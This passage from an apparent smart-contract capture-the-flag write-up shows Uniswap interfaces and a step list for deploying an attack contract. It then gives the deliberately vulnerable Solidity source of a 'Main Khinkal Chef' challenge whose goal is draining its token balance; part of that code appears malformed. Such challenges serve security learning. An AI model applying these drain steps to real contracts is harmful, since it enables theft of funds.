punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sync</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount0Out<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount1Out<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IUniswapV2Router</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">WETH</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">addLiquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _tokenB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountADesired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBDesired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountAMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">removeLiquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _tokenB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountAMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">swapExactTokensForTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountOutMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> _path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _amounts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">swapETHForExactTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountOut<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> _path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _amounts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getAmountOut</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _reserveIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _reserveOut<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountOut<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nstep1：获得token0和token1地址\nstep2：部署攻击合约\nstep3：<span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>Attack<span class=\"token punctuation\">,</span><span class=\"token number\">5000</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span>\nstep4：<span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>Attack<span class=\"token punctuation\">,</span><span class=\"token number\">5000</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span>\nstep5：attack\nstep6：toPlayer\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202205210222115.png\"></p>\n<h2 id=\"5-Main-Khinkal-Chef\"><a href=\"#5-Main-Khinkal-Chef\" class=\"headerlink\" title=\"5.Main Khinkal Chef\"></a>5.Main Khinkal Chef</h2><h3 id=\"request\"><a href=\"#request\" class=\"headerlink\" title=\"request\"></a>request</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>MainChef is against slavery! Move from <code>MasterChef</code> to <code>MainChef</code> and move from <code>SUSHI</code>s to <code>KHINKAL</code>s!</p>\n<p>Please check if you can drain the funds from our main contract.</p>\n<p>You have to drain all the KHINKAL tokens from the MainChef’s balance.</p></blockquote>\n<h3 id=\"Code-4\"><a href=\"#Code-4\" class=\"headerlink\" title=\"Code\"></a>Code</h3><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.12</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/EnumerableSet.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/math/SafeMath.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/access/Ownable.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">LPToken</span> <span class=\"token keyword\">is</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LP Token\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"LPT\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token number\">10e18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">KhinkalToken</span> <span class=\"token keyword\">is</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"KhinkalToken\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"KHINKAL\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_moveDelegates</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _delegates<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> _delegates<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Checkpoint</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint32</span> fromBlock<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> votes<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span> <span class=\"token operator\">=></span> Checkpoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> checkpoints<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> numCheckpoints<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> DOMAIN_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> DELEGATION_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> nonces<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">DelegateChanged</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> delegator<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> fromDelegate<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> toDelegate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">DelegateVotesChanged</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> delegate<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> previousBalance<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> newBalance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">delegates</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> delegator<span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _delegates<span class=\"token punctuation\">[</span>delegator<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">delegate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> delegatee<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">_delegate</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> delegatee<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">delegateBySig</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> delegatee<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> expiry<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">bytes32</span> domainSeparator <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n                DOMAIN_TYPEHASH<span class=\"token punctuation\">,</span>\n                <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">getChainId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes32</span> structHash <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n                DELEGATION_TYPEHASH<span class=\"token punctuation\">,</span>\n                delegatee<span class=\"token punctuation\">,</span>\n                nonce<span class=\"token punctuation\">,</span>\n                expiry\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes32</span> digest <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string\">\"\\x19\\x01\"</span><span class=\"token punctuation\">,</span>\n                domainSeparator<span class=\"token punctuation\">,</span>\n                structHash\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">address</span> signatory <span class=\"token operator\">=</span> <span class=\"token function\">ecrecover</span><span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>signatory <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"KHINKAL::delegateBySig: invalid signature\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>nonce <span class=\"token operator\">==</span> nonces<span class=\"token punctuation\">[</span>signatory<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"KHINKAL::delegateBySig: invalid nonce\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>now <span class=\"token operator\">&lt;=</span> expiry<span class=\"token punctuation\">,</span> <span class=\"token string\">\"KHINKAL::delegateBySig: signature expired\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">_delegate</span><span class=\"token punctuation\">(</span>signatory<span class=\"token punctuation\">,</span> delegatee<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getCurrentVotes</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint32</span> nCheckpoints <span class=\"token operator\">=</span> numCheckpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> nCheckpoints <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">?</span> checkpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nCheckpoints <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>votes <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getPriorVotes</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> blockNumber<span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>blockNumber <span class=\"token operator\">&lt;</span> block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">,</span> <span class=\"token string\">\"KHINKAL::getPriorVotes: not yet determined\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint32</span> nCheckpoints <span class=\"token operator\">=</span> numCheckpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nCheckpoints <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>checkpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nCheckpoints <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>fromBlock <span class=\"token operator\">&lt;=</span> blockNumber<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> checkpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nCheckpoints <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>votes<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>checkpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>fromBlock <span class=\"token operator\">></span> blockNumber<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token builtin\">uint32</span> lower <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint32</span> upper <span class=\"token operator\">=</span> nCheckpoints <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>upper <span class=\"token operator\">></span> lower<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">uint32</span> center <span class=\"token operator\">=</span> upper <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>upper <span class=\"token operator\">-</span> lower<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ceil, avoiding overflow</span>\n            Checkpoint <span class=\"token keyword\">memory</span> cp <span class=\"token operator\">=</span> checkpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>center<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">.</span>fromBlock <span class=\"token operator\">==</span> blockNumber<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> cp<span class=\"token punctuation\">.</span>votes<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">.</span>fromBlock <span class=\"token operator\">&lt;</span> blockNumber<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                lower <span class=\"token operator\">=</span> center<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n                upper <span class=\"token operator\">=</span> center <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> checkpoints<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>lower<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>votes<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_delegate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> delegator<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> delegatee<span class=\"token punctuation\">)</span><span class=\"token keyword\">internal</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> currentDelegate <span class=\"token 